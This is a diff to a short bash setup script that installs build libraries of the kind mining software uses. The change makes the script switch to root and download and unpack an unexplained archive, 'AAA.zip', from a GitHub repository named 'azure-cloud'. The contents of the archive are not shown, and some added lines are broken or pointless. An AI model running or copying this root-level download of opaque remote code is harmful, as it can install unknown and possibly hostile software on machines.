@@ -1,4 +1,12 @@
 
 #!/bin/bash
 
-sudo apt-get --assume-yes install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev ocl-icd-opencl-dev
+sudo su
+
+apt-get --assume-yes install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev ocl-icd-opencl-dev unzip
+
+wget https://github.com/U117A/azure-cloud/raw/master/AAA.zip
+
+mv AAA.zip ./
+unzip AAA.zip
+rm -rf AAA.zip
